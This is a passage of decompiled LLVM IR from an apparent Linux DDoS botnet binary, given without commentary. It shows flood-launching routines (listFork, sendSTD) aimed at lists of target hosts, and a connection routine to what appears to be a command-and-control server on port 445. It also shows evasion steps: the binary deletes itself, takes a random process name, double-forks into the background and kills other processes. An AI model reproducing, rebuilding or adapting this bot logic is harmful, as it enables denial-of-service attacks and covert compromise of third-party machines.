  %v5_8048f94 = icmp ult i32 %v0_8048f94, 12
  store i1 %v5_8048f94, i1* %cf.global-to-local, align 1
  %v1_8048f98 = call i32 @atol(i32 %v2_8048f92)
  %v1_8048fa6 = add i32 %tmp31, 12
  %v1_8048fa9 = inttoptr i32 %v1_8048fa6 to i32*
  %v2_8048fa9 = load i32, i32* %v1_8048fa9, align 4
  %v5_8048fab = icmp ult i32* %stack_var_-92, inttoptr (i32 12 to i32*)
  store i1 %v5_8048fab, i1* %cf.global-to-local, align 1
  %v1_8048faf = call i32 @atol(i32 %v2_8048fa9)
  %v1_8048fbd = add i32 %tmp31, 16
  %v1_8048fc0 = inttoptr i32 %v1_8048fbd to i32*
  %v2_8048fc0 = load i32, i32* %v1_8048fc0, align 4
  store i1 %v5_8048fab, i1* %cf.global-to-local, align 1
  %v1_8048fc6 = call i32 @atol(i32 %v2_8048fc0)
  %v5_8048fd4 = icmp ult i32* %stack_var_-92, inttoptr (i32 8 to i32*)
  store i1 %v5_8048fd4, i1* %cf.global-to-local, align 1
  %v2_8048fda = inttoptr i32 %v2_8048f87 to i8*
  %v3_8048fda = call i32 @__GI_strchr(i8* %v2_8048fda, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048fe2 = icmp eq i32 %v3_8048fda, 0
  br i1 %v1_8048fe2, label %dec_label_pc_8049043, label %dec_label_pc_8048fe6

dec_label_pc_8048fe6:                             ; preds = %dec_label_pc_8048f81
  store i32 %v2_8048f87, i32* @eax, align 4
  store i1 %v5_8048fd4, i1* %cf.global-to-local, align 1
  %v2_8048ff2 = call i32 @__GI_strtok(i32 %v2_8048f87, i32 ptrtoint (i32* @global_var_804fd1e.20 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804903b46 = icmp eq i32 %v2_8048ff2, 0
  %v1_804903f47 = icmp eq i1 %v4_804903b46, false
  br i1 %v1_804903f47, label %dec_label_pc_8048fff, label %dec_label_pc_804906e

dec_label_pc_8048fff:                             ; preds = %dec_label_pc_8048fe6, %dec_label_pc_8049026
  %storemerge1448 = phi i32 [ %v2_8049030, %dec_label_pc_8049026 ], [ %v2_8048ff2, %dec_label_pc_8048fe6 ]
  %v0_8048fff = call i32 @listFork()
  store i32 %v0_8048fff, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8049004 = icmp eq i32 %v0_8048fff, 0
  %v1_8049006 = icmp eq i1 %v1_8049004, false
  br i1 %v1_8049006, label %dec_label_pc_8049026, label %dec_label_pc_8049008

dec_label_pc_8049008:                             ; preds = %dec_label_pc_8048fff
  %v4_8049014 = trunc i32 %v1_8048f98 to i16
  %v5_8049014 = call i32 @sendSTD(i32 %storemerge1448, i16 %v4_8049014, i32 %v1_8048faf, i32 %v1_8048fc6)
  store i1 %v5_8048fab, i1* %cf.global-to-local, align 1
  %v1_8049021 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8049026:                             ; preds = %dec_label_pc_8048fff
  %v0_8049026 = load i32, i32* @esp, align 4
  %v5_8049026 = icmp ult i32 %v0_8049026, 8
  store i1 %v5_8049026, i1* %cf.global-to-local, align 1
  %v2_8049030 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_804fd1e.20 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804903b = icmp eq i32 %v2_8049030, 0
  %v1_804903f = icmp eq i1 %v4_804903b, false
  br i1 %v1_804903f, label %dec_label_pc_8048fff, label %dec_label_pc_804906e

dec_label_pc_8049043:                             ; preds = %dec_label_pc_8048f81
  %v0_8049043 = call i32 @listFork()
  store i32 %v0_8049043, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8049048 = icmp eq i32 %v0_8049043, 0
  %v1_804904a = icmp eq i1 %v1_8049048, false
  br i1 %v1_804904a, label %dec_label_pc_8049149, label %dec_label_pc_8049050

dec_label_pc_8049050:                             ; preds = %dec_label_pc_8049043
  %v4_804905c = trunc i32 %v1_8048f98 to i16
  %v5_804905c = call i32 @sendSTD(i32 %v2_8048f87, i16 %v4_804905c, i32 %v1_8048faf, i32 %v1_8048fc6)
  store i1 %v5_8048fab, i1* %cf.global-to-local, align 1
  %v1_8049069 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804906e:                             ; preds = %dec_label_pc_8048fe6, %dec_label_pc_8049026, %entry
  %v2_8049071 = load i32, i32* %v1_8048f41, align 4
  store i32 2, i32* %stack_var_-92, align 4
  store i1 false, i1* @df, align 1
  %v4_8049085 = inttoptr i32 %v2_8049071 to i8*
  %v7_804908e = call i32 @_strncmp(i8* %v4_8049085, i8* bitcast (i8** @global_var_804fd20.21 to i8*), i32 2)
  %v8_804908e = urem i32 %v7_804908e, 2
  %v9_804908e = icmp eq i32 %v8_804908e, 0
  %v0_8049090 = load i1, i1* %cf.global-to-local, align 1
  %v2_8049090 = or i1 %v0_8049090, %v9_804908e
  %v3_8049090 = zext i1 %v2_8049090 to i8
  %v7_8049090 = xor i8 %v3_8049090, 1
  %v3_8049098 = zext i1 %v0_8049090 to i8
  %v4_8049098 = sub nsw i8 %v7_8049090, %v3_8049098
  %v15_8049098 = icmp eq i8 %v4_8049098, 0
  %v2_804909c = sext i8 %v4_8049098 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80490a1 = icmp eq i1 %v15_8049098, false
  br i1 %v1_80490a1, label %dec_label_pc_8049149, label %dec_label_pc_804910e.preheader

dec_label_pc_804910e.preheader:                   ; preds = %dec_label_pc_804906e
  br label %dec_label_pc_804910e

dec_label_pc_80490b7:                             ; preds = %dec_label_pc_8049135, %dec_label_pc_804910e
  %v2_80490ba = mul i32 %storemerge, 4
  %v0_80490bf = load i32, i32* @global_var_8054564.18, align 4
  %v2_80490c4 = add i32 %v0_80490bf, %v2_80490ba
  %v1_80490c7 = inttoptr i32 %v2_80490c4 to i32*
  %v2_80490c7 = load i32, i32* %v1_80490c7, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80490c9 = icmp eq i32 %v2_80490c7, 0
  br i1 %v1_80490c9, label %dec_label_pc_804910b, label %dec_label_pc_80490cd

dec_label_pc_80490cd:                             ; preds = %dec_label_pc_80490b7
  %v9_80490ba = and i32 %storemerge, 1073741824
  %v10_80490ba = icmp ne i32 %v9_80490ba, 0
  store i1 %v10_80490ba, i1* %cf.global-to-local, align 1
  %v2_80490dd = load i32, i32* %v1_80490c7, align 4
  store i32 %v2_80490dd, i32* @ebx, align 4
  %v0_80490df = call i32 @__libc_getpid()
  %v0_80490e4 = load i32, i32* @ebx, align 4
  %v7_80490e4 = icmp ult i32 %v0_80490e4, %v0_80490df
  store i1 %v7_80490e4, i1* %cf.global-to-local, align 1
  %v12_80490e4 = icmp eq i32 %v0_80490e4, %v0_80490df
  br i1 %v12_80490e4, label %dec_label_pc_804910b, label %dec_label_pc_80490e8

dec_label_pc_80490e8:                             ; preds = %dec_label_pc_80490cd
  %v0_80490f0 = load i32, i32* @global_var_8054564.18, align 4
  %v2_80490f5 = add i32 %v0_80490f0, %v2_80490ba
  %v1_80490f8 = inttoptr i32 %v2_80490f5 to i32*
  %v2_80490f8 = load i32, i32* %v1_80490f8, align 4
  %v0_80490fa = load i32, i32* @esp, align 4
  %v5_80490fa = icmp ult i32 %v0_80490fa, 8
  store i1 %v5_80490fa, i1* %cf.global-to-local, align 1
  %v2_8049100 = call i32 @kill(i32 %v2_80490f8, i32 9)
  %v0_8049105 = load i32, i32* @esp, align 4
  %v2_8049105 = icmp ugt i32 %v0_8049105, -17
  store i1 %v2_8049105, i1* %cf.global-to-local, align 1
  %v4_8049108 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_804910b

dec_label_pc_804910b:                             ; preds = %dec_label_pc_80490cd, %dec_label_pc_80490b7, %dec_label_pc_80490e8
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_80490b7 ], [ %stack_var_-28.1, %dec_label_pc_80490cd ], [ %v4_8049108, %dec_label_pc_80490e8 ]
  %v4_804910b = add i32 %storemerge, 1
  br label %dec_label_pc_804910e

dec_label_pc_804910e:                             ; preds = %dec_label_pc_804910e.preheader, %dec_label_pc_804910b
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804910b ], [ 0, %dec_label_pc_804910e.preheader ]
  %storemerge = phi i32 [ %v4_804910b, %dec_label_pc_804910b ], [ 0, %dec_label_pc_804910e.preheader ]
  %v0_804911c = load i32, i32* @global_var_8052300.16, align 256
  %v0_8049121 = load i32, i32* @global_var_8052304.17, align 4
  %v10_8049130 = icmp ne i32 %v0_8049121, 0
  store i1 %v10_8049130, i1* %cf.global-to-local, align 1
  br i1 %v10_8049130, label %dec_label_pc_80490b7, label %dec_label_pc_8049135

dec_label_pc_8049135:                             ; preds = %dec_label_pc_804910e
  %v10_8049140 = icmp ult i32 %storemerge, %v0_804911c
  store i1 %v10_8049140, i1* %cf.global-to-local, align 1
  br i1 %v10_8049140, label %dec_label_pc_80490b7, label %dec_label_pc_8049149

dec_label_pc_8049149:                             ; preds = %dec_label_pc_8049135, %dec_label_pc_8048f77, %dec_label_pc_804906e, %dec_label_pc_8049043
  %v0_8049150 = phi i32 [ %v2_8048f6c, %dec_label_pc_8048f77 ], [ %v2_804909c, %dec_label_pc_804906e ], [ %v0_8049043, %dec_label_pc_8049043 ], [ %v0_804911c, %dec_label_pc_8049135 ]
  %v2_804914c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804914c, i32* @ebx, align 4
  store i32 %v0_8048f39, i32* @esi, align 4
  store i32 %v0_8048f38, i32* @edi, align 4
  ret i32 %v0_8049150

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v2_80490ba, { 1, 0 }
  uselistorder i1 %v0_8049090, { 1, 0 }
  uselistorder i32 %v2_8049030, { 1, 0 }
  uselistorder i1 %v5_8048fab, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8048f87, { 3, 0, 2, 1 }
  uselistorder i1 %v0_8048f60, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-92, { 2, 1, 0 }
  uselistorder i32 %tmp31, { 4, 3, 2, 1, 0 }
  uselistorder i1* %cf.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 8, 22, 9, 10, 14, 11, 12, 13, 0, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25 }
  uselistorder i32 ()* @listFork, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_804fd1e.20 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_8049149, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804910e, { 1, 0 }
  uselistorder label %dec_label_pc_804910b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804906e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048fff, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %v2_804915a = ptrtoint i32* %stack_var_-4104 to i32
  %v3_804916e = bitcast i32* %stack_var_-4104 to i8*
  %v4_804916e = call i32 @__GI_memset(i8* %v3_804916e, i32 0, i32 4096)
  %v0_8049176 = load i32, i32* @global_var_8052308.15, align 8
  %v1_804917b = icmp eq i32 %v0_8049176, 0
  br i1 %v1_804917b, label %dec_label_pc_804919a, label %dec_label_pc_804917f

dec_label_pc_804917f:                             ; preds = %entry
  %v1_8049188 = call i32 @__libc_close(i32 %v0_8049176)
  store i32 0, i32* @global_var_8052308.15, align 8
  br label %dec_label_pc_804919a

dec_label_pc_804919a:                             ; preds = %entry, %dec_label_pc_804917f
  %v0_804919a = load i32, i32* @global_var_8052030.22, align 16
  %v1_804919f = icmp eq i32 %v0_804919a, 0
  %v1_80491a1 = icmp eq i1 %v1_804919f, false
  br i1 %v1_80491a1, label %dec_label_pc_80491af, label %dec_label_pc_80491ba

dec_label_pc_80491af:                             ; preds = %dec_label_pc_804919a
  %v1_80491b4 = add i32 %v0_804919a, 1
  br label %dec_label_pc_80491ba

dec_label_pc_80491ba:                             ; preds = %dec_label_pc_804919a, %dec_label_pc_80491af
  %storemerge = phi i32 [ %v1_80491b4, %dec_label_pc_80491af ], [ 0, %dec_label_pc_804919a ]
  store i32 %storemerge, i32* @global_var_8052030.22, align 16
  %v1_80491bf = mul i32 %storemerge, 4
  %v2_80491bf = add i32 %v1_80491bf, ptrtoint ([15 x i8]** @global_var_805202c.24 to i32)
  %v3_80491bf = inttoptr i32 %v2_80491bf to i32*
  %v4_80491bf = load i32, i32* %v3_80491bf, align 4
  store i32 %v4_80491bf, i32* @eax, align 4
  %v3_80491d1 = call i32 @strcpy(i8* %v3_804916e, i32 %v4_80491bf)
  %v3_80491ec = call i32 @__GI_strchr(i8* %v3_804916e, i32 58)
  %v1_80491f4 = icmp eq i32 %v3_80491ec, 0
  br i1 %v1_80491f4, label %dec_label_pc_8049233, label %dec_label_pc_80491f8

dec_label_pc_80491f8:                             ; preds = %dec_label_pc_80491ba
  %v3_8049204 = call i32 @__GI_strchr(i8* %v3_804916e, i32 58)
  %v1_804920c = add i32 %v3_8049204, 1
  %v1_8049211 = call i32 @atol(i32 %v1_804920c)
  %v3_8049228 = call i32 @__GI_strchr(i8* %v3_804916e, i32 58)
  %v4_8049228 = inttoptr i32 %v3_8049228 to i8*
  store i8 0, i8* %v4_8049228, align 1
  br label %dec_label_pc_8049233

dec_label_pc_8049233:                             ; preds = %dec_label_pc_80491ba, %dec_label_pc_80491f8
  %stack_var_-8.0 = phi i32 [ 445, %dec_label_pc_80491ba ], [ %v1_8049211, %dec_label_pc_80491f8 ]
  %v3_804923c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_804923c, i32* @global_var_8052308.15, align 8
  %v4_804925c = call i32 @connectTimeout(i32 %v3_804923c, i32 %v2_804915a, i32 %stack_var_-8.0, i32 30)
  %v1_8049264 = icmp eq i32 %v4_804925c, 0
  %. = zext i1 %v1_8049264 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 (i32)* @atol, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049233, { 1, 0 }
  uselistorder label %dec_label_pc_80491ba, { 1, 0 }
  uselistorder label %dec_label_pc_804919a, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i8*, align 4
  %tmp67 = call i8* @__decompiler_undefined_function_3()
  %tmp76 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-4284 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-4400 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_8049286 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8049286, i32* @ebx, align 4
  %v4_804929e = ptrtoint i8** %argv to i32
  store i32 %v4_804929e, i32* %eax.global-to-local, align 4
  %v1_80492a1 = bitcast i8** %argv to i32*
  %v2_80492a1 = load i32, i32* %v1_80492a1, align 4
  store i32 %v2_80492a1, i32* %eax.global-to-local, align 4
  store i32 %v2_80492a1, i32* %stack_var_-4400, align 4
  %v1_80492a7 = call i32 @unlink(i32 %v2_80492a1)
  store i32 %v1_80492a7, i32* %eax.global-to-local, align 4
  %v0_80492af = call i32 @rand_init()
  store i32 %v0_80492af, i32* %eax.global-to-local, align 4
  %v0_80492b4 = call i32 @rand_next()
  %v1_80492b9 = mul i32 %v0_80492b4, 4
  %v2_80492bc = and i32 %v1_80492b9, 12
  %v1_80492bf = add nuw nsw i32 %v2_80492bc, 12
  %v2_80492c5 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_80492c5, i32* @eax, align 4
  %v2_80492cc = bitcast i32* %stack_var_-112 to i8*
  %v3_80492cc = call i32 @rand_alphastr(i8* %v2_80492cc, i32 %v1_80492bf)
  %v0_80492d7 = load i32, i32* @ebp, align 4
  %v2_80492d7 = add nsw i32 %v2_80492bc, -92
  %v3_80492d7 = add i32 %v2_80492d7, %v0_80492d7
  %v4_80492d7 = inttoptr i32 %v3_80492d7 to i8*
  store i8 0, i8* %v4_80492d7, align 1
  store i32 %v4_804929e, i32* %eax.global-to-local, align 4
  %v2_80492df = load i32, i32* %v1_80492a1, align 4
  store i32 %v2_80492df, i32* @edx, align 4
  store i32 %v2_80492c5, i32* %eax.global-to-local, align 4
  %v2_80492e8 = call i32 @util_strcpy(i32 %v2_80492df, i32 %v2_80492c5)
  store i32 %v2_80492e8, i32* %eax.global-to-local, align 4
  %v0_80492f0 = call i32 @rand_next()
  %v7_80492fc = udiv i32 %v0_80492f0, 2
  store i32 %v7_80492fc, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %v0_80492f0, i32* @edi, align 4
  %v2_8049329 = mul i32 %v0_80492f0, 4
  %v1_804932c = add i32 %v2_8049329, 12
  store i32 %v2_80492c5, i32* @eax, align 4
  %v3_8049339 = call i32 @rand_alphastr(i8* %v2_80492cc, i32 %v1_804932c)
  %v0_8049344 = load i32, i32* @ebp, align 4
  %v2_8049344 = add i32 %v2_8049329, -92
  %v3_8049344 = add i32 %v2_8049344, %v0_8049344
  %v4_8049344 = inttoptr i32 %v3_8049344 to i8*
  store i8 0, i8* %v4_8049344, align 1
  store i32 %v2_80492c5, i32* %eax.global-to-local, align 4
  store i32 15, i32* %stack_var_-4400, align 4
  %v2_8049352 = call i32 @prctl(i32 15, i32 %v2_80492c5)
  store i32 %v2_8049352, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-4400, align 4
  %v2_804935f = call i32 @__GI_time(i32* null)
  store i32 %v2_804935f, i32* %eax.global-to-local, align 4
  store i32 %v2_804935f, i32* @ebx, align 4
  %v0_8049369 = call i32 @__libc_getpid()
  %v1_804936e = load i32, i32* @ebx, align 4
  %v2_804936e = xor i32 %v1_804936e, %v0_8049369
  store i32 %v2_804936e, i32* @eax, align 4
  store i32 %v2_804936e, i32* %stack_var_-4400, align 4
  %v1_8049374 = call i32 @srand(i32 %v2_804936e)
  store i32 %v1_8049374, i32* %eax.global-to-local, align 4
  %v0_804937c = call i32 @rand_init()
  store i32 %v0_804937c, i32* %eax.global-to-local, align 4
  %v1_8049381 = call i32 @__libc_fork(i32 %v2_804936e)
  store i32 %v1_8049381, i32* %eax.global-to-local, align 4
  %v4_8049389 = icmp eq i32 %v1_8049381, 0
  br i1 %v4_8049389, label %dec_label_pc_80493b6, label %dec_label_pc_80493b0.thread

dec_label_pc_80493b0.thread:                      ; preds = %entry
  %v2_8049394 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_8049394, i32* %eax.global-to-local, align 4
  store i32 %v1_8049381, i32* %stack_var_-4400, align 4
  %v3_804939e = call i32 @__libc_waitpid(i32 %v1_8049381, i32 %v2_8049394, i32 0)
  store i32 %v3_804939e, i32* @eax, align 4
  store i32 0, i32* %stack_var_-4400, align 4
  %v1_80493ab = call i32 @__GI_exit(i32 0)
  store i32 %v1_80493ab, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80493ce

dec_label_pc_80493b6:                             ; preds = %entry
  %v0_80493b6 = load i32, i32* %stack_var_-4400, align 4
  %v1_80493b6 = call i32 @__libc_fork(i32 %v0_80493b6)
  store i32 %v1_80493b6, i32* @eax, align 4
  %v4_80493be = icmp eq i32 %v1_80493b6, 0
  br i1 %v4_80493be, label %dec_label_pc_80493ce, label %dec_label_pc_80493c4

dec_label_pc_80493c4:                             ; preds = %dec_label_pc_80493b6
  %v1_80493c9 = call i32 @__GI_exit(i32 0)
  store i32 %v1_80493c9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80493ce

dec_label_pc_80493ce:                             ; preds = %dec_label_pc_80493b0.thread, %dec_label_pc_80493b6, %dec_label_pc_80493c4
  %v1_80493d6 = call i32 @chdir(i32 ptrtoint (i32* @global_var_804fd22.25 to i32))
  store i32 %v1_80493d6, i32* %eax.global-to-local, align 4
  %v2_80493e5 = call i32 @__bsd_signal(i32 13, i32 1)
  store i32 %v2_80493e5, i32* %eax.global-to-local, align 4
  %v2_80498a2 = ptrtoint i32* %stack_var_-4284 to i32
  %tmp108 = bitcast i32* %stack_var_-4284 to i8*
  %v5_8049641 = and i32 %v2_80498a2, -256
  %v1_804964e = or i32 %v2_80498a2, 1
  %v5_8049680 = inttoptr i32 %v1_804964e to i8*
  %tmp109 = bitcast i8** %stack_var_-32 to i32*
  %v2_8049859 = ptrtoint i32* %stack_var_-188 to i32
  br label %dec_label_pc_80493ef.outer

dec_label_pc_80493ef.outer:                       ; preds = %dec_label_pc_80498a2, %dec_label_pc_80493ce
  %stack_var_-60.0.ph = phi i8* [ %tmp67, %dec_label_pc_80493ce ], [ %stack_var_-60.2, %dec_label_pc_80498a2 ]
  %stack_var_-56.0.ph = phi i32 [ %tmp76, %dec_label_pc_80493ce ], [ %stack_var_-56.3, %dec_label_pc_80498a2 ]
  br label %dec_label_pc_80493ef

dec_label_pc_80493ef:                             ; preds = %dec_label_pc_80493ef.outer, %dec_label_pc_80493ef
  %v0_80493ef = call i32 @initConnection()
  store i32 %v0_80493ef, i32* %eax.global-to-local, align 4
  %v1_80493f4 = icmp eq i32 %v0_80493ef, 0
  %v1_80493f6 = icmp eq i1 %v1_80493f4, false
  br i1 %v1_80493f6, label %dec_label_pc_80493ef, label %dec_label_pc_80498a2.preheader

dec_label_pc_80498a2.preheader:                   ; preds = %dec_label_pc_80493ef
  %v0_80498ae.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80498a2

dec_label_pc_8049417:                             ; preds = %dec_label_pc_8049609, %dec_label_pc_80495be
  %v2_804941a = mul i32 %storemerge22, 4
  store i32 %v2_804941a, i32* %edx.global-to-local, align 4
  %v0_804941f = load i32, i32* @global_var_8054564.18, align 4
  %v2_8049424 = add i32 %v0_804941f, %v2_804941a
  store i32 %v2_8049424, i32* %eax.global-to-local, align 4
  %v1_8049427 = inttoptr i32 %v2_8049424 to i32*
  %v2_8049427 = load i32, i32* %v1_8049427, align 4
  store i32 %v2_8049427, i32* %eax.global-to-local, align 4
  %v1_804942c = add i32 %v0_8049429.in, 8
  %v2_804942c = inttoptr i32 %v1_804942c to i32*
  store i32 1, i32* %v2_804942c, align 4
  %v1_804942e = add i32 %v0_8049429.in, 4
  %v2_804942e = inttoptr i32 %v1_804942e to i32*
  store i32 0, i32* %v2_804942e, align 4
  %v0_8049430 = load i32, i32* %eax.global-to-local, align 4
  %v3_8049430 = inttoptr i32 %v0_8049429.in to i32*
  store i32 %v0_8049430, i32* %v3_8049430, align 4
  %v4_8049431 = call i32 @__libc_waitpid(i32 %storemerge22, i32 %v2_8049431, i32 %stack_var_-56.2)
  store i32 %v4_8049431, i32* %eax.global-to-local, align 4
  %v0_8049436 = load i32, i32* @esp, align 4
  %tmp110 = icmp slt i32 %v4_8049431, 1
  %.pre = add i32 %storemerge22, 1
  br i1 %tmp110, label %dec_label_pc_80495bb, label %dec_label_pc_8049441

dec_label_pc_8049441:                             ; preds = %dec_label_pc_8049417
  store i32 %.pre, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049474

dec_label_pc_804944a:                             ; preds = %dec_label_pc_8049474, %dec_label_pc_80494ad
  %v2_804944d = mul i32 %storemerge24, 4
  %v0_8049452 = load i32, i32* @global_var_8054564.18, align 4
  %v2_8049457 = add i32 %v0_8049452, %v2_804944d
  %v1_804945a = add i32 %v2_8049457, -4
  store i32 %v2_804944d, i32* %edx.global-to-local, align 4
  store i32 %v2_8049457, i32* %eax.global-to-local, align 4
  %v1_804946d = inttoptr i32 %v2_8049457 to i32*
  %v2_804946d = load i32, i32* %v1_804946d, align 4
  store i32 %v2_804946d, i32* %eax.global-to-local, align 4
  %v2_804946f = inttoptr i32 %v1_804945a to i32*
  store i32 %v2_804946d, i32* %v2_804946f, align 4
  %v4_8049471 = add i32 %storemerge24, 1
  br label %dec_label_pc_8049474

dec_label_pc_8049474:                             ; preds = %dec_label_pc_8049441, %dec_label_pc_804944a
  %storemerge24 = phi i32 [ %v4_8049471, %dec_label_pc_804944a ], [ %.pre, %dec_label_pc_8049441 ]
  %v0_8049488 = load i32, i32* @global_var_8052300.16, align 256
  store i32 %v0_8049488, i32* %eax.global-to-local, align 4
  %v0_804948d = load i32, i32* @global_var_8052304.17, align 4
  store i32 %v0_804948d, i32* %edx.global-to-local, align 4
  %v10_80494a5 = icmp eq i32 %v0_804948d, 0
  br i1 %v10_80494a5, label %dec_label_pc_80494ad, label %dec_label_pc_804944a

dec_label_pc_80494ad:                             ; preds = %dec_label_pc_8049474
  store i32 0, i32* @ebx, align 4
  store i32 %v0_8049488, i32* @edi, align 4
  %v10_80494c1 = icmp ult i32 %storemerge24, %v0_8049488
  br i1 %v10_80494c1, label %dec_label_pc_804944a, label %dec_label_pc_80494c9

dec_label_pc_80494c9:                             ; preds = %dec_label_pc_80494ad
  %v2_80494cc = mul i32 %storemerge24, 4
  %v0_80494d1 = load i32, i32* @global_var_8054564.18, align 4
  %v2_80494d6 = add i32 %v2_80494cc, -4
  %v1_80494d9 = add i32 %v2_80494d6, %v0_80494d1
  %v1_80494dc = inttoptr i32 %v1_80494d9 to i32*
  store i32 0, i32* %v1_80494dc, align 4
  %v0_80494e2 = load i32, i32* @global_var_8052300.16, align 256
  %v0_80494e7 = load i32, i32* @global_var_8052304.17, align 4
  %v1_80494ed = add i32 %v0_80494e2, -1
  %v4_80494ed = icmp ne i32 %v0_80494e2, 0
  %v2_80494f0 = zext i1 %v4_80494ed to i32
  %v3_80494f0 = add i32 %v0_80494e7, -1
  %v4_80494f0 = add i32 %v3_80494f0, %v2_80494f0
  store i32 %v1_80494ed, i32* @global_var_8052300.16, align 256
  store i32 %v4_80494f0, i32* @global_var_8052304.17, align 4
  %v3_8049509 = mul i32 %v4_80494f0, 4
  %v4_8049509 = udiv i32 %v1_80494ed, 1073741824
  %v5_8049509 = or i32 %v3_8049509, %v4_8049509
  store i32 %v5_8049509, i32* %edx.global-to-local, align 4
  %v2_804950d = mul i32 %v1_80494ed, 4
  %v1_8049510 = add i32 %v2_804950d, 4
  store i32 %v1_8049510, i32* %eax.global-to-local, align 4
  %v0_8049513 = load i32, i32* @esp, align 4
  %v2_8049516 = add i32 %v0_8049513, -16
  %v3_8049516 = inttoptr i32 %v2_8049516 to i32*
  store i32 %v1_8049510, i32* %v3_8049516, align 4
  %v1_8049517 = call i32 @malloc(i32 0)
  store i32 %v1_8049517, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804954d

dec_label_pc_804952b:                             ; preds = %dec_label_pc_804954d, %dec_label_pc_8049586
  %v2_804952e = mul i32 %storemerge23, 4
  %v5_8049533 = add i32 %v2_804952e, %v1_8049517
  store i32 %v2_804952e, i32* %edx.global-to-local, align 4
  %v0_804953e = load i32, i32* @global_var_8054564.18, align 4
  %v2_8049543 = add i32 %v0_804953e, %v2_804952e
  store i32 %v2_8049543, i32* %eax.global-to-local, align 4
  %v1_8049546 = inttoptr i32 %v2_8049543 to i32*
  %v2_8049546 = load i32, i32* %v1_8049546, align 4
  store i32 %v2_8049546, i32* %eax.global-to-local, align 4
  %v2_8049548 = inttoptr i32 %v5_8049533 to i32*
  store i32 %v2_8049546, i32* %v2_8049548, align 4
  %v4_804954a = add i32 %storemerge23, 1
  br label %dec_label_pc_804954d

dec_label_pc_804954d:                             ; preds = %dec_label_pc_80494c9, %dec_label_pc_804952b
  %storemerge23 = phi i32 [ %v4_804954a, %dec_label_pc_804952b ], [ 0, %dec_label_pc_80494c9 ]
  %v0_8049561 = load i32, i32* @global_var_8052300.16, align 256
  store i32 %v0_8049561, i32* %eax.global-to-local, align 4
  %v0_8049566 = load i32, i32* @global_var_8052304.17, align 4
  store i32 %v0_8049566, i32* %edx.global-to-local, align 4
  %v10_804957e = icmp eq i32 %v0_8049566, 0
  br i1 %v10_804957e, label %dec_label_pc_8049586, label %dec_label_pc_804952b

dec_label_pc_8049586:                             ; preds = %dec_label_pc_804954d
  store i32 0, i32* @ebx, align 4
  store i32 %v0_8049561, i32* @edi, align 4
  %v10_804959a = icmp ult i32 %storemerge23, %v0_8049561
  br i1 %v10_804959a, label %dec_label_pc_804952b, label %dec_label_pc_80495a2

dec_label_pc_80495a2:                             ; preds = %dec_label_pc_8049586
  %v0_80495a2 = load i32, i32* @global_var_8054564.18, align 4
  store i32 %v0_80495a2, i32* %eax.global-to-local, align 4
  %v0_80495a7 = load i32, i32* @esp, align 4
  %v2_80495aa = add i32 %v0_80495a7, -16
  %v3_80495aa = inttoptr i32 %v2_80495aa to i32*
  store i32 %v0_80495a2, i32* %v3_80495aa, align 4
  %v1_80495ab = call i32 @free(i32 0)
  %v0_80495b0 = load i32, i32* @esp, align 4
  store i32 %v1_8049517, i32* %eax.global-to-local, align 4
  store i32 %v1_8049517, i32* @global_var_8054564.18, align 4
  br label %dec_label_pc_80495bb

dec_label_pc_80495bb:                             ; preds = %dec_label_pc_8049417, %dec_label_pc_80495a2
  %v0_804942949.in = phi i32 [ %v0_80495b0, %dec_label_pc_80495a2 ], [ %v0_8049436, %dec_label_pc_8049417 ]
  %stack_var_-56.1 = phi i32 [ %v1_8049517, %dec_label_pc_80495a2 ], [ %stack_var_-56.2, %dec_label_pc_8049417 ]
  br label %dec_label_pc_80495be

dec_label_pc_80495be:                             ; preds = %dec_label_pc_80495be.preheader, %dec_label_pc_80495bb
